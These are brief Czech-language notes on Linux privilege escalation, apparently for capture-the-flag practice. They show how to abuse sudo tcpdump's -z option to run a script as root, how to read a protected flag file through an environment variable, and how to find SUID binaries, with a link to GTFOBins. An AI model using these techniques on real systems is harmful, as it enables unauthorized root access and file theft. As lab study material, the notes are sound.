`sudo -l` -> prikazy, ktere muzeme spustit se sudo

## tcpdump exploit
- parametr `-z` umoznuje spustit custom script, napr:

``` bash
#!/bin/bash
cat <absolute path to flag.txt> >> <absolute path to output.txt>
```

ale musime pridat rozhrani (`-i lo`) a  parametry `-w 1 -G 1`

``` bash
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/script -Z root
```

nasledne:
``` bash
cat output.txt
```


## environment value exploit

``` bash
read <new env var> < <value> && echo "$<new env var>"
```

e.g.
``` bash
read test < flag.txt && echo "$test"
```

# SUID
**S**et owner **U**ser **ID** up on execution
pokud nekdo spusti program, ktery ma SUID, nespusti se s pravy volajiciho, ale vlastnika
pozna se podle

``` bash
find / -perm -u=s -type f 2>/dev/null
```

``` bash
ls -la
-rwsr-xr-x 1 root root 54256 Jan  1 12:00 /usr/bin/passwd
```
(vlastnik ma misto -x- **-s-**)

**velmi prakticka stranka:** [Priv Esc web](https://gtfobins.org/)
